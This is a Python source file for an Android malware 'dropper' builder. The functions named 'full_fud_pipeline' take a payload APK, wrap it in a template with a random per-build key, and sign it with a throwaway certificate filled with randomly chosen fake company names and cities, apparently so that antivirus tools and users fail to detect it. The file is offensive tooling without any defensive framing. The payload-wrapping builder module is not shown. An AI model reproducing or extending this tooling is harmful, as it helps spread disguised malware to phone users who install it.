"""Auto-build dropper: input APK → fresh template → sign → output."""
import os
import random
import shutil
import subprocess
import time
import uuid

from config import (
    KEYSTORE_DIR, KEYSTORE_PASS, KEY_ALIAS,
    APKSIGNER_BIN, ZIPALIGN_BIN, JAVA_BIN,
)
from setup import ensure_tools
from builder import build_template


def _step(session_dir, msg):
    try:
        with open(os.path.join(session_dir, "step.txt"), "w") as f:
            f.write(msg)
    except Exception:
        pass
    print(f"\n===== {msg} =====", flush=True)


def _java_env() -> dict:
    env = os.environ.copy()
    jhome = os.path.dirname(os.path.dirname(JAVA_BIN))
    env["JAVA_HOME"] = jhome
    env["PATH"] = os.path.dirname(JAVA_BIN) + os.pathsep + env.get("PATH", "")
    return env


def _generate_keystore() -> str:
    os.makedirs(KEYSTORE_DIR, exist_ok=True)
    ks = os.path.join(KEYSTORE_DIR,
                      f"k_{int(time.time())}_{uuid.uuid4().hex[:8]}.p12")

    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives.serialization import pkcs12
    import datetime

    key = rsa.generate_private_key(public_exponent=65537, key_size=4096)

    org_pool = [
        "CyberLink Solutions", "Nexa Systems", "ByteForge",
        "Quantum Apps", "DeltaSoft", "Vertex Labs", "Aurora Interactive",
        "Ironclad Mobile", "Solaris Tech", "Northwind Digital",
        "Helix Studio", "Polaris Group", "Summit Mobile",
    ]
    loc_pool = [
        ("US", "California", "San Jose"),
        ("US", "Texas", "Austin"),
        ("US", "Washington", "Seattle"),
        ("US", "New York", "New York"),
        ("GB", "England", "London"),
        ("DE", "Berlin", "Berlin"),
        ("FR", "Ile-de-France", "Paris"),
        ("NL", "North Holland", "Amsterdam"),
        ("SE", "Stockholm", "Stockholm"),
        ("JP", "Tokyo", "Tokyo"),
        ("CA", "Ontario", "Toronto"),
        ("AU", "New South Wales", "Sydney"),
    ]
    country, state, city = random.choice(loc_pool)
    org = random.choice(org_pool)
    ou_pool = ["Mobile", "Engineering", "Apps", "Development", "Product", "Client", "Platform"]
    cn_pool = ["Android", "Mobile App", "App Developer", "Mobile Client", "Application", "Release"]

    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME,             country),
        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME,   state),
        x509.NameAttribute(NameOID.LOCALITY_NAME,            city),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME,        org),
        x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, random.choice(ou_pool)),
        x509.NameAttribute(NameOID.COMMON_NAME,              random.choice(cn_pool)),
    ])
    now = datetime.datetime.utcnow()
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject).issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - datetime.timedelta(days=1))
        .not_valid_after(now + datetime.timedelta(days=10950))
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .sign(key, hashes.SHA384())
    )
    p12 = pkcs12.serialize_key_and_certificates(
        name=KEY_ALIAS.encode(), key=key, cert=cert, cas=None,
        encryption_algorithm=serialization.BestAvailableEncryption(KEYSTORE_PASS.encode()),
    )
    with open(ks, "wb") as f:
        f.write(p12)
    return ks


def _sign(unsigned_apk: str, output_apk: str):
    ks = _generate_keystore()
    aligned = unsigned_apk + ".aligned"
    env = _java_env()

    subprocess.run(
        [ZIPALIGN_BIN, "-f", "-p", "4", unsigned_apk, aligned],
        check=True, capture_output=True, timeout=180, env=env,
    )

    cmd = [
        APKSIGNER_BIN, "sign",
        "--ks", ks,
        "--ks-pass", f"pass:{KEYSTORE_PASS}",
        "--ks-key-alias", KEY_ALIAS,
        "--key-pass", f"pass:{KEYSTORE_PASS}",
        "--v1-signing-enabled", "true",
        "--v2-signing-enabled", "true",
        "--v3-signing-enabled", "true",
        "--v4-signing-enabled", "true",
        "--out", output_apk,
        aligned,
    ]
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=600, env=env)
    if p.returncode != 0:
        raise RuntimeError(f"apksigner: {p.stdout} {p.stderr}")

    if os.path.exists(aligned):
        os.remove(aligned)
    try:
        if os.path.exists(ks):
            os.remove(ks)
    except Exception:
        pass


def full_fud_pipeline_dropper(template_apk: str, payload_apk: str,
                              output_apk: str, session_dir: str) -> str:
    """template_apk arg ignored — kept for signature compat. payload_apk = input APK."""
    _step(session_dir, "ensure_tools")
    ensure_tools()
    os.makedirs(session_dir, exist_ok=True)

    if not os.path.exists(payload_apk):
        raise RuntimeError(f"payload missing: {payload_apk}")

    _step(session_dir, "1/3 generate per-build key")
    key = os.urandom(32)
    print(f"[i] key: {key.hex()[:16]}...", flush=True)

    _step(session_dir, "2/3 build template from input APK")
    unsigned, pkg, label = build_template(payload_apk, session_dir, key)

    _step(session_dir, "3/3 sign")
    _sign(unsigned, output_apk)

    for p in (unsigned, payload_apk):
        try:
            if os.path.exists(p):
                os.remove(p)
        except Exception:
            pass

    _step(session_dir, "done")
    print(f"[✓] DONE → {output_apk} (pkg={pkg}, label={label!r})", flush=True)
    return output_apk


def full_fud_pipeline(input_apk: str, output_apk: str, session_dir: str) -> str:
    ensure_tools()
    os.makedirs(session_dir, exist_ok=True)
    tmp = output_apk + ".unsigned"
    shutil.copy2(input_apk, tmp)
    _sign(tmp, output_apk)
    if os.path.exists(tmp):
        os.remove(tmp)
    if os.path.exists(input_apk):
        os.remove(input_apk)
    return output_apk
